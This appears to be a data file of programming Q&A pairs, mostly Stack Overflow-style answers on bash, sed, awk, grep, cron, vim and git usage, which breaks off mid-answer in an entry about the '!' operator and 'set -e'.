    "Run Python script at startup in Ubuntu": "Instructions\nCopy the python file to /bin:\nsudo cp -i /path/to/your_script.py /bin\nAdd A New Cron Job:\nsudo crontab -e\nScroll to the bottom and add the following line (after all the #'s):\n@reboot python /bin/your_script.py &\nThe \u201c&\u201d at the end of the line means the command is run in the background and it won\u2019t stop the system booting up.\nTest it:\nsudo reboot\nPractical example:\nAdd this file to your Desktop: test_code.py (run it to check that it works for you)\nfrom os.path import expanduser\nimport datetime\n\nfile = open(expanduser(\"~\") + '/Desktop/HERE.txt', 'w')\nfile.write(\"It worked!\\n\" + str(datetime.datetime.now()))\nfile.close()\nRun the following commands:\nsudo cp -i ~/Desktop/test_code.py /bin\nsudo crontab -e\nAdd the following line and save it:\n@reboot python /bin/test_code.py &\nNow reboot your computer and you should find a new file on your Desktop: HERE.txt",
    "Using grep and sed to find and replace a string": "You can use find and -exec directly into sed rather than first locating oldstr with grep. It's maybe a bit less efficient, but that might not be important. This way, the sed replacement is executed over all files listed by find, but if oldstr isn't there it obviously won't operate on it.\nfind /path -type f -exec sed -i 's/oldstr/newstr/g' {} \\;",
    "What is the difference between ! and % in Jupyter notebooks?": "! calls out to a shell (in a new process), while % affects the process associated with the notebook (or the notebook itself; many % commands have no shell counterpart).\n!cd foo, by itself, has no lasting effect, since the process with the changed directory immediately terminates.\n%cd foo changes the current directory of the notebook process, which is a lasting effect.",
    "What is colon : in npm script names?": "I believe it's just a naming convention to group a set of related tasks. For example you might have\n\"test:ci\": ...\n\"test:units\": ....\n\"test:integration\"...\nIn this case it is grouping a related set of test tasks.\nIt would be down to the package author to specify. You can split tasks out like described in the answer above and then have a 'global' test command which combines each of them e.g. test:ci && test:unit && test:integration enabling you to run them all at once or when individually when needed.\nYou can use npm-run-all (link) and use the command npm-run-all test:*, which would then find all scripts starting with the test: group.",
    "Execute crontab twice daily at 00h and 13:30": "Try this-: 00 01,13 * * *\nit will run at 1 A.M and 1 P.M",
    "How to schedule to run first Sunday of every month": "You can put something like this in the crontab file:\n00 09 * * 7 [ $(date +\\%d) -le 07 ] && /run/your/script\nThe date +%d gives you the number of the current day, and then you can check if the day is less than or equal to 7. If it is, run your command.\nIf you run this script only on Sundays, it should mean that it runs only on the first Sunday of the month.\nRemember that in the crontab file, the formatting options for the date command should be escaped.",
    "Command to clear shell while using emacs shell": "Update February 2015\nJust noticed that Emacs now (version 25+) has the command comint-clear-buffer, bound to C-c M-o by default, that does what we need here, and probably is preferable to the answers I originally posted below.\nOptions to consider:\nC-l will recenter the buffer. Pressing it repeatedly cycles the buffer, so that point appears at the top, middle, or bottom of the buffer. When it stops at the top, the buffer looks like it's been cleared, although all the text is still there, out of view.\nC-x h marks the whole buffer, after which C-w kills it. This kills the last prompt as well, but after you enter the next command you get your prompt back.\nYou can also use erase-buffer, which isn't bound to a key by default, but it's easily done (you can also use M-x erase-buffer:\n    (defun my-shell-hook ()\n      (local-set-key \"\\C-cl\" 'erase-buffer))\n\n    (add-hook 'shell-mode-hook 'my-shell-hook)\nThat binds it to C-c l; you can pick what you like.\nA quick fix to re-create your prompt after clearing is possible:\n    (defun my-clear ()\n      (interactive)\n      (erase-buffer)\n      (comint-send-input))\n\n    (defun my-shell-hook ()\n      (local-set-key \"\\C-cl\" 'my-clear))\n\n    (add-hook 'shell-mode-hook 'my-shell-hook)\nAfter you've been using emacs for a while, marking and killing regions becomes natural, so you might find the first option is enough. If not, the last option is closest to what you want.\nEDIT: just found this on the emacs wiki, it's better than my option 4:\n(defun my-clear ()\n  (interactive)\n  (let ((comint-buffer-maximum-size 0))\n    (comint-truncate-buffer)))",
    "Write byte at address (hexedit/modify binary from the command line)": "printf '\\x31\\xc0\\xc3' | dd of=test_blob bs=1 seek=100 count=3 conv=notrunc\ndd arguments:\nof | file to patch\nbs | 1 byte at a time please\nseek | go to position 100 (decimal)\nconv=notrunc | don't truncate the output after the edit (which dd does by default)\nOne Josh looking out for another ;)",
    "Running windows shell commands with python": "The newer subprocess.check_output and similar commands are supposed to replace os.system. See this page for details. While I can't test this on Windows (because I don't have access to any Windows machines), the following should work:\nfrom subprocess import check_output\ncheck_output(\"dir C:\", shell=True)\ncheck_output returns a string of the output from your command. Alternatively, subprocess.call just runs the command and returns the status of the command (usually 0 if everything is okay).\nAlso note that, in python 3, that string output is now bytes output. If you want to change this into a string, you need something like\nfrom subprocess import check_output\ncheck_output(\"dir C:\", shell=True).decode()\nIf necessary, you can tell it the kind of encoding your program outputs. The default is utf-8, which typically works fine, but other standard options are here.\nAlso note that @bluescorpion says in the comments that Windows 10 needs a trailing backslash, as in check_output(\"dir C:\\\\\", shell=True). The double backslash is needed because \\ is a special character in python, so it has to be escaped. (Also note that even prefixing the string with r doesn't help if \\ is the very last character of the string \u2014 r\"dir C:\\\" is a syntax error, though r\"dir C:\\ \" is not.)",
    "Get Application Name/ Label via ADB Shell or Terminal": "",
    "How to extract a value from a string using regex and a shell?": "You can do this with GNU grep's perl mode:\necho \"12 BBQ ,45 rofl, 89 lol\" | grep -P '\\d+ (?=rofl)' -o\necho \"12 BBQ ,45 rofl, 89 lol\" | grep --perl-regexp '\\d+ (?=rofl)' --only-matching\n-P and --perl-regexp mean Perl-style regular expression. -o and --only-matching mean to output only the matching text.",
    "Store grep output in an array": "Old answer (written in the year 2014) made an assumption that output filenames won't contain special characters like whitespaces or globs. Here is a safe way to read those special filenames into an array: (will work with older bash versions)\nwhile IFS= read -rd ''; do\n   targets+=(\"$REPLY\")\ndone < <(grep --null -HRl \"pattern\" .)\n\n# check content of array\ndeclare -p targets\nOn BASH 4+ you can use readarray instead of a loop:\nreadarray -d '' -t targets < <(grep --null -HRl \"pattern\" .)\nOld Answer:\nYou can use:\ntargets=($(grep -HRl \"pattern\" .))\nNote use of (...) for array creation in BASH.\nAlso you can use grep -l to get only file names in grep's output (as shown in my command).",
    "Exit code of variable assignment to command substitution in Bash": "Upon executing a command as $(command) allows the output of the command to replace itself.\nWhen you say:\na=$(false)             # false fails; the output of false is stored in the variable a\nthe output produced by the command false is stored in the variable a. Moreover, the exit code is the same as produced by the command. help false would tell:\nfalse: false\n    Return an unsuccessful result.\n    \n    Exit Status:\n    Always fails.\nOn the other hand, saying:\n$ false                # Exit code: 1\n$ a=\"\"                 # Exit code: 0\n$ echo $?              # Prints 0\ncauses the exit code for the assignment to a to be returned which is 0.\nEDIT:\nQuoting from the manual:\nIf one of the expansions contained a command substitution, the exit status of the command is the exit status of the last command substitution performed.\nQuoting from BASHFAQ/002:\nHow can I store the return value and/or output of a command in a variable?\n...\noutput=$(command)\nstatus=$?\nThe assignment to output has no effect on command's exit status, which is still in $?.\nThis is not bash-specific. Quoting the end of section 2.9.1 \"Simple Commands\" in the \"Shell & Utilities\" volume of the The Open Group Base Specifications Issue 7, POSIX.1-2017 :\nIf there is no command name, but the command contained a command substitution, the command shall complete with the exit status of the last command substitution performed",
    "How to recognize whether a script is running on a tty?": "import os, sys\nos.isatty(sys.stdout.fileno())\nor\nsys.stdout.isatty()",
    "Round a divided number in Bash": "To do rounding up in truncating arithmetic, simply add (denom-1) to the numerator.\nExample, rounding down:\nN/2\nM/5\nK/16\nExample, rounding up:\n(N+1)/2\n(M+4)/5\n(K+15)/16\nTo do round-to-nearest, add (denom/2) to the numerator (halves will round up):\n(N+1)/2\n(M+2)/5\n(K+8)/16",
    "Is there an interactive interpreter for C#? [closed]": "Update for 2022\nAfter installing Visual Studio 2022, add the following to your PATH environment variable.\nC:\\Program Files (x86)\\Microsoft Visual Studio\\Shared\\Packages\\Microsoft.Net.Compilers.2.6.1\\tools\nThen open your terminal (CMD, PowerShell, Windows Terminal) and type csi to run C Sharp Interactive.\nYou'll get something like this:\nPS C:\\> csi\nMicrosoft (R) Visual C# Interactive Compiler version 2.6.1.62414\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nType \"#help\" for more information.\n> var list = new List<int>{ 1, 2, 3, 4 };\n> list // You don't need to call Console.WriteLine() to see values\nList<int>(4) { 1, 2, 3, 4 }\n> // You can keep adding lines as needed\nPrevious Answer\nWith the Visual Studio 2015 Update 1 there now is a C# Interactive tool window built into Visual Studio.\nThe new tool window is invoked by going to View \u2192 Other Windows \u2192 C# Interactive.\nFor Visual Studio 2010 to 2013 you can use the Roslyn CTP to get a similar tool window in Visual Studio.",
    "CURL escape single quote": "I had the same problem. The simplest solution is to escape the apostrophe with a backslash in addition to wrapping it in a set of single quotes. '\\''\nFor your use case, change Mary's to Mary'\\''s and it should work.\ncurl -XPOST 'http://localhost:9290/location/place' -d '{\"geoloc\": {\"lat\": \"38.1899\", \"lon\": \"-76.5087\"}, \"longitude\": \"-76.5087\", \"admin_name1\": \"Maryland\", \"admin_name2\": \"St. Mary'\\''s\", \"admin_name3\": \"\", \"postal_code\": \"20692\", \"admin_code3\": \"\", \"country_code\": \"US\", \"admin_code1\": \"MD\", \"latitude\": \"38.1899\", \"admin_code2\": \"037\", \"accuracy\": null, \"place_name\": \"Valley Lee\"}'\nAn alternate approach is to wrap the POST data (-d) in double quotes while escaping all nested occurrences of double quotes in the JSON string with a backslash.\ncurl -XPOST 'http://localhost:9290/location/place' -d \"{\\\"geoloc\\\": {\\\"lat\\\": \\\"38.1899\\\", \\\"lon\\\": \\\"-76.5087\\\"}, \\\"longitude\\\": \\\"-76.5087\\\", \\\"admin_name1\\\": \\\"Maryland\\\", \\\"admin_name2\\\": \\\"St. Mary's\\\", \\\"admin_name3\\\": \\\"\\\", \\\"postal_code\\\": \\\"20692\\\", \\\"admin_code3\\\": \\\"\\\", \\\"country_code\\\": \\\"US\\\", \\\"admin_code1\\\": \\\"MD\\\", \\\"latitude\\\": \\\"38.1899\\\", \\\"admin_code2\\\": \\\"037\\\", \\\"accuracy\\\": null, \\\"place_name\\\": \\\"Valley Lee\\\"}\"",
    "How can I batch rename files using the Terminal?": "First, do a dry run (will not actually rename any files) with the following:\nfor file in *.mov\ndo\n  echo mv \"$file\" \"${file/MP4./}\"\ndone\nIf it all looks fine, remove the echo from the third line to actually rename the files.",
    "Calling an executable program using awk": "From the AWK man page:\nsystem(cmd)\n              executes cmd and returns its exit status\nThe GNU AWK manual also has a section that, in part, describes the system function and provides an example:\nsystem(\"date | mail -s 'awk run done' root\")",
    "Detect Apple Silicon from command line": "uname -m\nwill return arm64 as opposed to x86_64\nif [[ $(uname -m) == 'arm64' ]]; then\n  echo M1\nfi\nor, as @chepner suggested\nuname -p\nwill return arm as opposed to i386\nif [[ $(uname -p) == 'arm' ]]; then\n  echo M1\nfi\nyet another tool is arch:\nif [[ $(arch) == 'arm64' ]]; then\n  echo M1\nfi",
    "How to run a vim command from the shell command-line?": "Note, now the syntax has changed, and the line should read (As per @sheharyar):\nvim +PluginInstall +qall\nFor posterity, previously, the correct line was:\nvim +BundleInstall +qall\nShould anyone other than me be looking! Note: this is in the Github README for vundle.",
    "Pass command line arguments via sbatch": "I thought I'd offer some insight because I was also looking for the replacement to the -v option in qsub, which for sbatch can be accomplished using the --export option. I found a nice site here that shows a list of conversions from Torque to Slurm, and it made the transition much smoother.\nYou can specify the environment variable ahead of time in your bash script:\n$ var_name='1'\n$ sbatch -D `pwd` exampleJob.sh --export=var_name\nOr define it directly within the sbatch command just like qsub allowed:\n$ sbatch -D `pwd` exampleJob.sh --export=var_name='1'\nWhether this works in the # preprocessors of exampleJob.sh is also another question, but I assume that it should give the same functionality found in Torque.",
    "Meaning of \"=~\" operator in shell script [duplicate]": "it's the Equal Tilde operator that allows the use of regex in an if statement.\nAn additional binary operator, =~, is available, with the same precedence as == and !=. When it is used, the string to the right of the operator is considered an extended regular expression and matched accordingly (as in regex(3)). The return value is 0 if the string matches the pattern, and 1 otherwise. If the regular expression is syntactically incorrect, the conditional expression's return value is 2. If the shell option nocasematch is enabled, the match is performed without regard to the case of alphabetic characters. Any part of the pattern may be quoted to force it to be matched as a string.\nhttp://linux.die.net/man/1/bash",
    "ZSH not recognizing my aliases?": "if you do a very simple alias in zsh, does it work? open your .zshrc file, and add the following line:\nalias ls='ls -GpF'\nafter adding that line, type this line in your Terminal:\nsource ~/.zshrc\ntell us what happens. Also, just for shiggles, make sure you are using single quotes vs. double quotes, I have seen that make a difference in the past on different versions of shells/OS/whatnot.",
    "how to remove the first two columns in a file using shell (awk, sed, whatever)": "You can do it with cut:\ncut -d \" \" -f 3- input_filename > output_filename\nExplanation:\ncut: invoke the cut command\n-d \" \": use a single space as the delimiter (cut uses TAB by default)\n-f: specify fields to keep\n3-: all the fields starting with field 3\ninput_filename: use this file as the input\n> output_filename: write the output to this file.\nAlternatively, you can do it with awk:\nawk '{$1=\"\"; $2=\"\"; sub(\"  \", \" \"); print}' input_filename > output_filename\nExplanation:\nawk: invoke the awk command\n$1=\"\"; $2=\"\";: set field 1 and 2 to the empty string\nsub(...);: clean up the output fields because fields 1 & 2 will still be delimited by \" \"\nprint: print the modified line\ninput_filename > output_filename: same as above.",
    "How to convert hex to ASCII characters in the Linux shell?": "I used to do this with xxd:\necho -n 5a | xxd -r -p\nBut then I realised that in Debian/Ubuntu, xxd is part of vim-common and hence might not be present in a minimal system. To also avoid Perl (IMHO also not part of a minimal system), I ended up using sed, xargs, and printf like this:\necho -n 5a | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\\\\\\\\\x\\1/gI' | xargs printf\nMostly, I only want to convert a few bytes and it's okay for such tasks. The advantage of this solution over the one of ghostdog74 is, that this can convert hex strings of arbitrary lengths automatically. xargs is used because printf doesnt read from standard input.",
    "Run Python script without Windows console appearing": "pythonw.exe will run the script without a command prompt. The problem is that the Python interpreter, Python.exe, is linked against the console subsystem to produce console output (since that's 90% of cases) -- pythonw.exe is instead linked against the GUI subsystem, and Windows will not create a console output window for it unless it asks for one.\nThis article discusses GUI programming with Python, and also alludes to pythonw.exe. It also helpfully points out that if your Python files end with .pyw instead of .py, the standard Windows installer will set up associations correctly and run your Python in pythonw.exe.\nIn your case it doesn't sound like a problem, but reliance upon pythonw.exe makes your application Windows-specific -- other solutions exist to accomplish this on, say, Mac OS X.",
    "Boolean operators ( &&, -a, ||, -o ) in Bash": "Rule of thumb: Use -a and -o inside square brackets, && and || outside.\nIt's important to understand the difference between shell syntax and the syntax of the [ command.\n&& and || are shell operators. They are used to combine the results of two commands. Because they are shell syntax, they have special syntactical significance and cannot be used as arguments to commands.\n[ is not special syntax. It's actually a command with the name [, also known as test. Since [ is just a regular command, it uses -a and -o for its and and or operators. It can't use && and || because those are shell syntax that commands don't get to see.\nBut wait! Bash has a fancier test syntax in the form of [[ ]]. If you use double square brackets, you get access to things like regexes and wildcards. You can also use shell operators like &&, ||, <, and > freely inside the brackets because, unlike [, the double bracketed form is special shell syntax. Bash parses [[ itself so you can write things like [[ $foo == 5 && $bar == 6 ]].",
    "Grep - how to output only the content of a capturing group": "This question was asked ten years ago, so I won't mark it as duplicate. Also I noticed no sed solution was given since OP asked an answer without:\nsed -nE 's/(hello[0-9]+), please match me/\\1/p' test.txt\n-n stands for quiet (won't print anything except if explicitly asked)\n-E allows use of extended regular expressions (avoids here using \\ before parenthesis)\ns/reg/repl/p command means \"if regexp reg matches the current line, replace it by captured text by repl, and prints it (/p)\"",
    "Find file in directory from command line": "find /root/directory/to/search -name 'filename.*'\n# Directory is optional (defaults to cwd)\nStandard UNIX globbing is supported. See man find for more information.\nIf you're using Vim, you can use:\n:e **/filename.cpp\nOr :tabn or any Vim command which accepts a filename.",
    "How does Ctrl-C terminate a child process?": "Signals by default are handled by the kernel. Old Unix systems had 15 signals; now they have more. You can check </usr/include/signal.h> (or kill -l). CTRL+C is the signal with name SIGINT.\nThe default action for handling each signal is defined in the kernel too, and usually it terminates the process that received the signal.\nAll signals (but SIGKILL) can be handled by program.\nAnd this is what the shell does:\nWhen the shell running in interactive mode, it has a special signal handling for this mode.\nWhen you run a program, for example find, the shell:\nforks itself\nand for the child set the default signal handling\nreplace the child with the given command (e.g. with find)\nwhen you press CTRL+C, parent shell handle this signal but the child will receive it - with the default action - terminate. (the child can implement signal handling too)\nYou can trap signals in your shell script too...\nAnd you can set signal handling for your interactive shell too, try enter this at the top of you ~/.profile. (Ensure than you're a already logged in and test it with another terminal - you can lock out yourself)\ntrap 'echo \"Dont do this\"' 2\nNow, every time you press CTRL+C in your shell, it will print a message. Don't forget to remove the line!\nIf interested, you can check the plain old /bin/sh signal handling in the source code here.\nAt the above there were some misinformations in the comments (now deleted), so if someone interested here is a very nice link - how the signal handling works.",
    "is there a way to see the actual contents of a symlink?": "The ls -l command will show you that:\n$ ls -l foo\nlrwxrwxrwx 1 user group 11 2010-12-31 19:49 foo -> /etc/passwd\nOr the readlink command:\n$ readlink foo\n/etc/passwd\nSo, the symbolic link foo points to the path /etc/passwd.",
    "Why does \"local\" discard the return code of a command?": "The reason the code with local returns 0 is because $? \"Expands to the exit status of the most recently executed foreground pipeline.\" Thus $? is returning the success of local\nYou can fix this behavior by separating the declaration of x from the initialization of x like so:\n$ fun() { local x; x=$(false); echo \"exit code: $?\"; }; fun\nexit code: 1",
    "Passing environment variables in npm-scripts": "You have a few options:\nbetter-npm-run,which can define an env for each command separately\nInstead of a poststart script, you can concatenate commands for npm like so: \"start\": \"NODE_ENV=${NODE_ENV:=production} node start-app.js && echo $NODE_ENV\"\nUse a process manager in production like pm2. pm2 lets you define environment specific json files with settings such as NODE_ENV. At our company, we successfully run all of our apps in different environments with pm2 (all the while having the same start command)",
    "Detect if PATH has a specific directory entry in it": "Using grep is overkill, and can cause trouble if you're searching for anything that happens to include RE metacharacters. This problem can be solved perfectly well with bash's builtin [[ command:\nif [[ \":$PATH:\" == *\":$HOME/bin:\"* ]]; then\n  echo \"Your path is correctly set\"\nelse\n  echo \"Your path is missing ~/bin, you might want to add it.\"\nfi\nNote that adding colons before both the expansion of $PATH and the path to search for solves the substring match issue; double-quoting the path avoids trouble with metacharacters.",
    "Vim: Pipe selected text to shell cmd and receive output on vim info/command line": "For multi line version you can do this after selecting the text:\n:'<,'>:w !command<CR>\nSee the official Vim docs at :help :w_c.\nYou can map it to simple Visual mode shortcut like this:\nxnoremap <leader>c <esc>:'<,'>:w !command<CR>\nHit <leader key>+c in visual mode to send the selected text to a stdin of the command. stdout of the command will be printed below vim's statusbar.\nReal world example with CoffeeScript:\nhttps://github.com/epeli/vimconfig/commit/4047839c4e1c294ec7e15682f68563a0dbf0ee6d",
    "Git Checkout Latest Tag": "# Get new tags from remote\ngit fetch --tags\n\n# Get latest tag name\nlatestTag=$(git describe --tags \"$(git rev-list --tags --max-count=1)\")\n\n# Checkout latest tag\ngit checkout $latestTag",
    "Trim leading and trailing spaces from a string in awk": "If you want to trim all spaces, only in lines that have a comma, and use awk, then the following will work for you:\nawk -F, '/,/{gsub(/ /, \"\", $0); print} ' input.txt\nIf you only want to remove spaces in the second column, change the expression to\nawk -F, '/,/{gsub(/ /, \"\", $2); print$1\",\"$2} ' input.txt\nNote that gsub substitutes the character in // with the second expression, in the variable that is the third parameter - and does so in-place - in other words, when it's done, the $0 (or $2) has been modified.\nFull explanation:\n-F,            use comma as field separator \n               (so the thing before the first comma is $1, etc)\n/,/            operate only on lines with a comma \n               (this means empty lines are skipped)\ngsub(a,b,c)    match the regular expression a, replace it with b, \n               and do all this with the contents of c\nprint$1\",\"$2   print the contents of field 1, a comma, then field 2\ninput.txt      use input.txt as the source of lines to process\nEDIT I want to point out that @BMW's solution is better, as it actually trims only leading and trailing spaces with two successive gsub commands. Whilst giving credit I will give an explanation of how it works.\ngsub(/^[ \\t]+/,\"\",$2);    - starting at the beginning (^) replace all (+ = zero or more, greedy)\n                             consecutive tabs and spaces with an empty string\ngsub(/[ \\t]+$/,\"\",$2)}    - do the same, but now for all space up to the end of string ($)\n1                         - =\"true\". Shorthand for \"use default action\", which is print $0\n                          - that is, print the entire (modified) line",
    "Convert line endings [duplicate]": "Some options:\nUsing tr\ntr -d '\\15\\32' < windows.txt > unix.txt\nOR\ntr -d '\\r' < windows.txt > unix.txt \nUsing perl\nperl -p -e 's/\\r$//' < windows.txt > unix.txt\nUsing sed\nsed 's/^M$//' windows.txt > unix.txt\nOR\nsed 's/\\r$//' windows.txt > unix.txt\nTo obtain ^M, you have to type CTRL-V and then CTRL-M.",
    "Bash scripting, multiple conditions in while loop": "The correct options are (in increasing order of recommendation):\n# Single POSIX test command with -o operator (not recommended anymore).\n# Quotes strongly recommended to guard against empty or undefined variables.\nwhile [ \"$stats\" -gt 300 -o \"$stats\" -eq 0 ]\n\n# Two POSIX test commands joined in a list with ||.\n# Quotes strongly recommended to guard against empty or undefined variables.\nwhile [ \"$stats\" -gt 300 ] || [ \"$stats\" -eq 0 ]\n\n# Two bash conditional expressions joined in a list with ||.\nwhile [[ $stats -gt 300 ]] || [[ $stats -eq 0 ]]\n\n# A single bash conditional expression with the || operator.\nwhile [[ $stats -gt 300 || $stats -eq 0 ]]\n\n# Two bash arithmetic expressions joined in a list with ||.\n# $ optional, as a string can only be interpreted as a variable\nwhile (( stats > 300 )) || (( stats == 0 ))\n\n# And finally, a single bash arithmetic expression with the || operator.\n# $ optional, as a string can only be interpreted as a variable\nwhile (( stats > 300 || stats == 0 ))\nSome notes:\nQuoting the parameter expansions inside [[ ... ]] and ((...)) is optional; if the variable is not set, -gt and -eq will assume a value of 0.\nUsing $ is optional inside (( ... )), but using it can help avoid unintentional errors. If stats isn't set, then (( stats > 300 )) will assume stats == 0, but (( $stats > 300 )) will produce a syntax error.",
    "Append line to /etc/hosts file with shell script": "Make sure to use the -i option of sed.\n-i[SUFFIX], --in-place[=SUFFIX]\n  edit files in place (makes backup if extension supplied)\n\nsed -i \"2i192.241.xx.xx  venus.example.com venus\" /etc/hosts\nOtherwise,\necho \"192.241.xx.xx  venus.example.com venus\" >> /etc/hosts\nwould append the line at the end of the file, which could work as you expect.",
    "Incrementing a variable inside a Bash loop [duplicate]": "You are using USCOUNTER in a subshell, that's why the variable is not showing in the main shell.\nInstead of cat FILE | while ..., do just a while ... done < $FILE. This way, you avoid the common problem of I set variables in a loop that's in a pipeline. Why do they disappear after the loop terminates? Or, why can't I pipe data to read?:\nwhile read country _; do\n  if [ \"US\" = \"$country\" ]; then\n        USCOUNTER=$(expr $USCOUNTER + 1)\n        echo \"US counter $USCOUNTER\"\n  fi\ndone < \"$FILE\"\nNote I also replaced the `` expression with a $().\nI also replaced while read line; do country=$(echo \"$line\" | cut -d' ' -f1) with while read country _. This allows you to say while read var1 var2 ... varN where var1 contains the first word in the line, $var2 and so on, until $varN containing the remaining content.",
    "Remove first directory components from path of file": "You can use any of:\nx=a/b/c/d\ny=a/\necho ${x#a/}\necho ${x#$y}\necho ${x#*/}\nAll three echo commands produce b/c/d; you could use the value in any way you choose, of course.\nThe first is appropriate when you know the name you need to remove when writing the script.\nThe second is appropriate when you have a variable that contains the prefix you need to remove (minor variant: y=a; echo ${x#$y/}).\nThe third is the most general - it removes any arbitrary prefix up to the first slash. I was pleasantly surprised to find that the * worked non-greedily when I tested it with bash (version 3.2) on MacOS X 10.6.6 - I'll put that down to too much Perl and regex work (because, when I think about it, * in shell doesn't include slashes).",
    "Git run shell command for each commit": "You can use interactive rebase with an exec option.\ngit rebase -i --exec <build command> <first sha you want to test>~\n--exec <cmd> Append exec <cmd> after each line creating a commit in the final history. <cmd> will be interpreted as one or more shell commands.\nReordering and editing commits usually creates untested intermediate steps. You may want to check that your history editing did not break anything by running a test, or at least recompiling at intermediate points in history by using the exec command (shortcut x).\nThe interactive rebase will stop when a command fails (i.e. exits with non-0 status) to give you an opportunity to fix the problem.",
    "POSIX-Compliant Way to Scope Variables to a Function in a Shell Script": "It is normally done with the local keyword, which is, as you seem to know, not defined by POSIX. Here is an informative discussion about adding 'local' to POSIX.\nHowever, even the most primitive POSIX-compliant shell I know of which is used by some GNU/Linux distributions as the /bin/sh default, dash (Debian Almquist Shell), supports it. FreeBSD and NetBSD use ash, the original Almquist Shell, which also supports it. OpenBSD uses a ksh implementation for /bin/sh which also supports it. So unless you're aiming to support non-GNU non-BSD systems like Solaris, or those using standard ksh, etc., you could get away with using local. (Might want to put some comment right at the start of the script, below the shebang line, noting that it is not strictly a POSIX sh script. Just to be not evil.) Having said all that, you might want to check the respective man-pages of all these sh implementations that support local, since they might have subtle differences in how exactly they work. Or just don't use local:\nIf you really want to conform fully to POSIX, or don't want to mess with possible issues, and thus not use local, then you have a couple options. The answer given by Lars Brinkhoff is sound, you can just wrap the function in a sub-shell. This might have other undesired effects though. By the way shell grammar (per POSIX) allows the following:\nmy_function()\n(\n  # Already in a sub-shell here,\n  # I'm using ( and ) for the function's body and not { and }.\n)\nAlthough maybe avoid that to be super-portable, some old Bourne shells can be even non-POSIX-compliant. Just wanted to mention that POSIX allows it.\nAnother option would be to unset variables at the end of your function bodies, but that's not going to restore the old value of course so isn't really what you want I guess, it will merely prevent the variable's in-function value to leak outside. Not very useful I guess.\nOne last, and crazy, idea I can think of is to implement local yourself. The shell has eval, which, however evil, yields way to some insane possibilities. The following basically implements dynamic scoping a la old Lisps, I'll use the keyword let instead of local for further cool-points, although you have to use the so-called unlet at the end:\n# If you want you can add some error-checking and what-not to this.  At present,\n# wrong usage (e.g. passing a string with whitespace in it to `let', not\n# balancing `let' and `unlet' calls for a variable, etc.) will probably yield\n# very very confusing error messages or breakage.  It's also very dirty code, I\n# just wrote it down pretty much at one go.  Could clean up.\n\nlet()\n{\n    dynvar_name=$1;\n    dynvar_value=$2;\n\n    dynvar_count_var=${dynvar_name}_dynvar_count\n    if [ \"$(eval echo $dynvar_count_var)\" ]\n    then\n        eval $dynvar_count_var='$(( $'$dynvar_count_var' + 1 ))'\n    else\n        eval $dynvar_count_var=0\n    fi\n\n    eval dynvar_oldval_var=${dynvar_name}_oldval_'$'$dynvar_count_var\n    eval $dynvar_oldval_var='$'$dynvar_name\n\n    eval $dynvar_name='$'dynvar_value\n}\n\nunlet()\nfor dynvar_name\ndo\n    dynvar_count_var=${dynvar_name}_dynvar_count\n    eval dynvar_oldval_var=${dynvar_name}_oldval_'$'$dynvar_count_var\n    eval $dynvar_name='$'$dynvar_oldval_var\n    eval unset $dynvar_oldval_var\n    eval $dynvar_count_var='$(( $'$dynvar_count_var' - 1 ))'\ndone\nNow you can:\n$ let foobar test_value_1\n$ echo $foobar\ntest_value_1\n$ let foobar test_value_2\n$ echo $foobar\ntest_value_2\n$ let foobar test_value_3\n$ echo $foobar\ntest_value_3\n$ unlet foobar\n$ echo $foobar\ntest_value_2\n$ unlet foobar\n$ echo $foobar\ntest_value_1\n(By the way unlet can be given any number of variables at once (as different arguments), for convenience, not showcased above.)\nDon't try this at home, don't show it to children, don't show it your co-workers, don't show it to #bash at Freenode, don't show it to members of the POSIX committee, don't show it to Mr. Bourne, maybe show it to father McCarthy's ghost to give him a laugh. You have been warned, and you didn't learn it from me.\nEDIT:\nApparently I've been beaten, sending the IRC bot greybot on Freenode (belongs to #bash) the command \"posixlocal\" will make it give one some obscure code that demonstrates a way to achieve local variables in POSIX sh. Here is a somewhat cleaned up version, because the original was difficult to decipher:\nf()\n{\n    if [ \"$_called_f\" ]\n    then\n        x=test1\n        y=test2\n        echo $x $y\n    else\n        _called_f=X x= y= command eval '{ typeset +x x y; } 2>/dev/null; f \"$@\"'\n    fi\n}\nThis transcript demonstrates usage:\n$ x=a\n$ y=b\n$ f\ntest1 test2\n$ echo $x $y\na b\nSo it lets one use the variables x and y as locals in the then branch of the if form. More variables can be added at the else branch; note that one must add them twice, once like variable= in the initial list, and once passed as an argument to typeset. Note that no unlet or so is needed (it's a \"transparent\" implementation), and no name-mangling and excessive eval is done. So it seems to be a much cleaner implementation overall.\nEDIT 2:\nComes out typeset is not defined by POSIX, and implementations of the Almquist Shell (FreeBSD, NetBSD, Debian) don't support it. So the above hack will not work on those platforms.",
    "Calling one Bash script from another Script passing it arguments with quotes and spaces": "Quote your args in Testscript 1:\necho \"TestScript1 Arguments:\"\necho \"$1\"\necho \"$2\"\necho \"$#\"\n./testscript2 \"$1\" \"$2\"",
    "What's the meaning of a ! before a command in the shell?": "TL;DR: This is just by-passing the set -e flag in the specific line where you are using it.\nAdding add to hek2mgl's correct and useful answer.\nYou have:\nset -e\n! command\nBash Reference Manual \u2192 Pipelines describes:\nEach command in a pipeline is executed in its own subshell. The exit status of a pipeline is the exit status of the last command in the pipeline (...). If the reserved word \u2018!\u2019 precedes the pipeline, the exit status is the logical negation of the exit status as described above. The shell waits for all commands in the pipeline to terminate before returning a value.\nThis means that ! preceding a command is negating the exit status of it:\n$ echo 23\n23\n$ echo $?\n0\n                # But\n$ ! echo 23\n23\n$ echo $?\n1\nOr:\n$ echo 23 && echo \"true\" || echo \"fail\"\n23\ntrue\n$ ! echo 23 && echo \"true\" || echo \"fail\"\n23\nfail\nThe exit status is useful in many ways. In your script, used together with set -e makes the script exit whenever a command returns a non-zero status.\nThus, when you have:\nset -e\ncommand1\ncommand2\nIf command1 returns a non-zero status, the script will finish and won't proceed to command2.\nHowever, there is also an interesting point to mention, described in 4.3.1 The Set Builtin:\n-e\nExit immediately if a pipeline (see Pipelines), which may consist of a single simple command (see Simple Commands), a list (see Lists), or a compound command (see Compound Commands) returns a non-zero status. The shell does not exit if the command that fails is part of the command list immediately following a while or until keyword, part of the test in an if statement, part of any command executed in a && or || list except the command following the final && or ||, any command in a pipeline but the last, or if the command\u2019s return status is being inverted with !. If a compound command other than a subshell returns a non-zero status because a command failed while -e was being ignored, the shell does not exit. A trap on ERR, if set, is executed before the shell exits.\nTaking all of these into consideration, when you have:\nset -e\n! command1\ncommand2\nWhat you are doing is to by-pass the set -e flag in the command1. Why?\nif command1 runs properly, it will return a zero status. ! will negate it, but set -e won't trigger an exit by the because it comes from a return status inverted with !, as described above.\nif command1 fails, it will 